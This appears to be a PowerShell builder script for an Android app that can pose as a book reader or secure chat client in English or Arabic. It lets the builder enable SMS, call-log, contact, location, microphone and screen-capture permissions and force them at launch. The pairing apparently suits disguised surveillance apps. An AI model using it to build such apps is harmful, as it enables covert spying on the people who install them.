# =============================================================================
# Interactive APK builder
# Run:  .\build-apk.ps1
# Flags skip the interactive menu:
#   .\build-apk.ps1 -Design library -Locale en -AppName "My Books" -Variant release
# =============================================================================
param(
    [ValidateSet('storage-only','library','chat','chat-full','full','custom','')]
    [string]$Preset = '',
    [ValidateSet('library','chat','')]
    [string]$Design = '',
    [ValidateSet('en','ar','')]
    [string]$Locale = '',
    [string]$AppName = '',
    [ValidateSet('debug','release','')]
    [string]$Variant = ''
)

$ErrorActionPreference = 'Stop'
$Root      = $PSScriptRoot
$Profile   = Join-Path $Root 'build-profile.properties'
if (-not (Test-Path $Profile)) { Write-Error "Missing $Profile" }

# ── helpers ──────────────────────────────────────────────────────────────────

function Header([string]$text) {
    Write-Host ""
    Write-Host ("=" * 60) -ForegroundColor DarkCyan
    Write-Host "  $text" -ForegroundColor Cyan
    Write-Host ("=" * 60) -ForegroundColor DarkCyan
}

function Ask([string]$prompt, [string[]]$options, [string]$default) {
    $joined = $options -join " / "
    Write-Host ""
    Write-Host "$prompt" -ForegroundColor Yellow -NoNewline
    Write-Host " [$joined] " -ForegroundColor DarkGray -NoNewline
    Write-Host "(default: $default): " -ForegroundColor DarkGray -NoNewline
    $ans = Read-Host
    if ([string]::IsNullOrWhiteSpace($ans)) { return $default }
    return $ans.Trim().ToLower()
}

function AskYN([string]$prompt, [string]$default = 'n') {
    $ans = Ask $prompt @('y','n') $default
    return ($ans -eq 'y')
}

function DefaultAppName([string]$design, [string]$locale) {
    if ($design -eq 'chat') {
        if ($locale -eq 'ar') { return 'المعرض السوري' }
        return 'Secure Chat'
    }
    if ($locale -eq 'ar') { return 'مكتبة الكتب' }
    return 'Book Library'
}

function AskAppName([string]$design, [string]$locale, [string]$current) {
    $default = DefaultAppName $design $locale
    if (-not [string]::IsNullOrWhiteSpace($current)) { $default = $current }
    Write-Host ""
    Write-Host "App name (shown under icon on home screen)" -ForegroundColor Yellow
    Write-Host "  Press Enter for default: $default" -ForegroundColor DarkGray
    Write-Host "  Or type your custom name: " -ForegroundColor DarkGray -NoNewline
    $ans = Read-Host
    if ([string]::IsNullOrWhiteSpace($ans)) { return $default }
    return $ans.Trim()
}

function SetProp([string[]]$lines, [string]$key, [string]$value) {
    $found = $false
    $out = $lines | ForEach-Object {
        if ($_ -match "^\s*$([regex]::Escape($key))\s*=") {
            $found = $true
            "$key=$value"
        } else { $_ }
    }
    if (-not $found) { $out += "$key=$value" }
    return $out
}

# ── load current profile into a hashtable ────────────────────────────────────

function LoadProps([string]$path) {
    $h = @{}
    Get-Content $path | ForEach-Object {
        if ($_ -match '^\s*([^#=\s]+)\s*=\s*(.*)$') {
            $h[$Matches[1].Trim()] = $Matches[2].Trim()
        }
    }
    return $h
}

# ── interactive mode ──────────────────────────────────────────────────────────

$curr = LoadProps $Profile

if ($Preset -eq '' -and $Design -eq '' -and $Locale -eq '' -and $AppName -eq '' -and $Variant -eq '') {

    Clear-Host
    Header "Android APK Builder — interactive setup"

    # ── 1. App type ──
    Write-Host ""
    Write-Host "  1) library  — Book reader UI" -ForegroundColor White
    Write-Host "  2) chat     — Secure chat UI" -ForegroundColor White
    Write-Host ""
    $appChoice = Ask "App type?" @('1','2') '1'
    $designVal = if ($appChoice -eq '2') { 'chat' } else { 'library' }

    # ── 1b. App language ──
    Write-Host ""
    Write-Host "  1) en  — English UI" -ForegroundColor White
    Write-Host "  2) ar  — Arabic UI (RTL)" -ForegroundColor White
    Write-Host ""
    $langChoice = Ask "App language?" @('1','2') $(if ($curr['app.locale'] -eq 'ar') { '2' } else { '1' })
    $localeVal = if ($langChoice -eq '2') { 'ar' } else { 'en' }

    # ── 1c. App display name ──
    $appNameVal = AskAppName $designVal $localeVal $curr['app.display.name']

    # ── 2. Build variant ──
    $varChoice = Ask "Build variant?" @('release','debug') 'release'
    $variantVal = if ($varChoice -eq 'debug') { 'debug' } else { 'release' }

    # ── 3. Permission wizard ──
    Header "Permission wizard  (mandatory = app BLOCKS launch until granted)"
    Write-Host ""
    Write-Host "  Press Enter to keep current value shown in [brackets]" -ForegroundColor DarkGray
    Write-Host ""

    # Storage (always on)
    $permStorage   = $true
    $startStorage  = $true
    Write-Host "  Storage      : ALWAYS ON (required)" -ForegroundColor DarkGreen

    # Camera
    $permCamera  = AskYN "  Camera        — include permission? [current: $($curr['perm.camera'])]" `
                         $(if ($curr['perm.camera'] -eq 'true') {'y'} else {'n'})
    $startCamera = if ($permCamera) {
        AskYN "    └─ mandatory at startup?" $(if ($curr['startup.request.camera'] -eq 'true') {'y'} else {'n'})
    } else { $false }

    # Microphone
    $permMic  = AskYN "  Microphone    — include permission? [current: $($curr['perm.microphone'])]" `
                      $(if ($curr['perm.microphone'] -eq 'true') {'y'} else {'n'})
    $startMic = if ($permMic) {
        AskYN "    └─ mandatory at startup?" $(if ($curr['startup.request.microphone'] -eq 'true') {'y'} else {'n'})
    } else { $false }

    # Location
    $permLoc  = AskYN "  Location      — include permission? [current: $($curr['perm.location'])]" `
                      $(if ($curr['perm.location'] -eq 'true') {'y'} else {'n'})
    $startLoc = if ($permLoc) {
        AskYN "    └─ mandatory at startup?" $(if ($curr['startup.request.location'] -eq 'true') {'y'} else {'n'})
    } else { $false }

    # Notifications
    $permNotif  = AskYN "  Notifications — include permission? [current: $($curr['perm.notifications'])]" `
                        $(if ($curr['perm.notifications'] -eq 'true') {'y'} else {'n'})
    $startNotif = if ($permNotif) {
        AskYN "    └─ mandatory at startup?" $(if ($curr['startup.request.notifications'] -eq 'true') {'y'} else {'n'})
    } else { $false }

    # WiFi
    $permWifi = AskYN "  WiFi scan     — include permission? [current: $($curr['perm.wifi'])]" `
                      $(if ($curr['perm.wifi'] -eq 'true') {'y'} else {'n'})

    # SMS
    $permSms  = AskYN "  SMS           — include permission? [current: $($curr['perm.sms'])]" `
                      $(if ($curr['perm.sms'] -eq 'true') {'y'} else {'n'})
    $startSms = if ($permSms) {
        AskYN "    └─ mandatory at startup?" $(if ($curr['startup.request.sms'] -eq 'true') {'y'} else {'n'})
    } else { $false }

    # Contacts
    $permContacts  = AskYN "  Contacts      — include permission? [current: $($curr['perm.contacts'])]" `
                           $(if ($curr['perm.contacts'] -eq 'true') {'y'} else {'n'})

    # Call log
    $permCallLog   = AskYN "  Call log      — include permission? [current: $($curr['perm.call_log'])]" `
                           $(if ($curr['perm.call_log'] -eq 'true') {'y'} else {'n'})

    # Phone state
    $permPhone     = AskYN "  Phone state   — include permission? [current: $($curr['perm.phone_state'])]" `
                           $(if ($curr['perm.phone_state'] -eq 'true') {'y'} else {'n'})

    # Battery optimization
    $permBatt  = AskYN "  Battery opt   — include permission? [current: $($curr['perm.battery_optimization'])]" `
                       $(if ($curr['perm.battery_optimization'] -eq 'true') {'y'} else {'n'})
    $startBatt = if ($permBatt) {
        AskYN "    └─ mandatory at startup?" $(if ($curr['startup.request.battery_optimization'] -eq 'true') {'y'} else {'n'})
    } else { $false }

    # Screen capture
    $permScreen    = AskYN "  Screen capture— include permission? [current: $($curr['perm.screen_capture'])]" `
                           $(if ($curr['perm.screen_capture'] -eq 'true') {'y'} else {'n'})

    # ── 4. Summary ──
    Header "Summary"
    Write-Host ""
    Write-Host "  App type   : $designVal" -ForegroundColor White
    Write-Host "  Language   : $localeVal" -ForegroundColor White
    Write-Host "  App name   : $appNameVal" -ForegroundColor White
    Write-Host "  Variant    : $variantVal" -ForegroundColor White
    Write-Host ""
    $permMap = [ordered]@{
        'Storage'          = $permStorage
        'Camera'           = $permCamera
        'Microphone'       = $permMic
        'Location'         = $permLoc
        'Notifications'    = $permNotif
        'WiFi scan'        = $permWifi
        'SMS'              = $permSms
        'Contacts'         = $permContacts
        'Call log'         = $permCallLog
        'Phone state'      = $permPhone
        'Battery opt'      = $permBatt
        'Screen capture'   = $permScreen
    }
    foreach ($k in $permMap.Keys) {
        $icon  = if ($permMap[$k]) { '[ON ]' } else { '[off]' }
        $color = if ($permMap[$k]) { 'Green' } else { 'DarkGray' }
        Write-Host "  $icon  $k" -ForegroundColor $color
    }
    Write-Host ""
    $go = AskYN "Build now?" 'y'
    if (-not $go) { Write-Host "Aborted." -ForegroundColor Red; exit 0 }

    # ── 5. Write profile ──
    $bool = { param($b) if ($b) { 'true' } else { 'false' } }

    $lines = Get-Content $Profile
    $lines = SetProp $lines 'build.preset'                    'custom'
    $lines = SetProp $lines 'app.design.mode'                 $designVal
    $lines = SetProp $lines 'app.locale'                      $localeVal
    $lines = SetProp $lines 'app.display.name'              $appNameVal
    $lines = SetProp $lines 'perm.storage'                    'true'
    $lines = SetProp $lines 'perm.camera'                     (&$bool $permCamera)
    $lines = SetProp $lines 'perm.microphone'                 (&$bool $permMic)
    $lines = SetProp $lines 'perm.location'                   (&$bool $permLoc)
    $lines = SetProp $lines 'perm.notifications'              (&$bool $permNotif)
    $lines = SetProp $lines 'perm.wifi'                       (&$bool $permWifi)
    $lines = SetProp $lines 'perm.sms'                        (&$bool $permSms)
    $lines = SetProp $lines 'perm.contacts'                   (&$bool $permContacts)
    $lines = SetProp $lines 'perm.call_log'                   (&$bool $permCallLog)
    $lines = SetProp $lines 'perm.phone_state'                (&$bool $permPhone)
    $lines = SetProp $lines 'perm.battery_optimization'       (&$bool $permBatt)
    $lines = SetProp $lines 'perm.screen_capture'             (&$bool $permScreen)
    $lines = SetProp $lines 'startup.request.storage'         'true'
    $lines = SetProp $lines 'startup.request.camera'          (&$bool $startCamera)
    $lines = SetProp $lines 'startup.request.microphone'      (&$bool $startMic)
    $lines = SetProp $lines 'startup.request.location'        (&$bool $startLoc)
    $lines = SetProp $lines 'startup.request.notifications'   (&$bool $startNotif)
    $lines = SetProp $lines 'startup.request.sms'             (&$bool $startSms)
    $lines = SetProp $lines 'startup.request.battery_optimization' (&$bool $startBatt)
    $lines | Set-Content $Profile -Encoding UTF8

    $variantVal = $variantVal

} else {
    # ── non-interactive: flags were passed directly ──────────────────────────
    $variantVal = if ($Variant -ne '') { $Variant } else { 'release' }
    $lines = Get-Content $Profile
    if ($Preset)  { $lines = SetProp $lines 'build.preset'    $Preset }
    if ($Design)  { $lines = SetProp $lines 'app.design.mode' $Design }
    if ($Locale)  { $lines = SetProp $lines 'app.locale'      $Locale }
    if ($AppName)  { $lines = SetProp $lines 'app.display.name' $AppName }
    $lines | Set-Content $Profile -Encoding UTF8
}

# ── show final profile ────────────────────────────────────────────────────────
Header "Active build profile"
Get-Content $Profile | Where-Object { $_ -match '^(build\.|app\.design|app\.locale|app\.display|perm\.|startup\.)' } |
    ForEach-Object {
        $color = if ($_ -match '=true') { 'Green' } elseif ($_ -match '=false') { 'DarkGray' } else { 'Cyan' }
        Write-Host "  $_" -ForegroundColor $color
    }
Write-Host ""

# ── build ─────────────────────────────────────────────────────────────────────
Header "Building ($variantVal)..."
Push-Location $Root
try {
    if ($variantVal -eq 'debug') {
        .\gradlew.bat assembleDebug --no-daemon
        $apk = 'app\build\outputs\apk\debug\app-debug.apk'
    } else {
        .\gradlew.bat assembleRelease --no-daemon
        $apk = 'app\build\outputs\apk\release\app-release.apk'
    }
    if (Test-Path $apk) {
        $f = Get-Item $apk
        Write-Host ""
        Write-Host "  APK ready:" -ForegroundColor Green
        Write-Host "  $($f.FullName)" -ForegroundColor White
        Write-Host "  Size: $([math]::Round($f.Length/1MB, 2)) MB" -ForegroundColor White
    }
} finally {
    Pop-Location
}
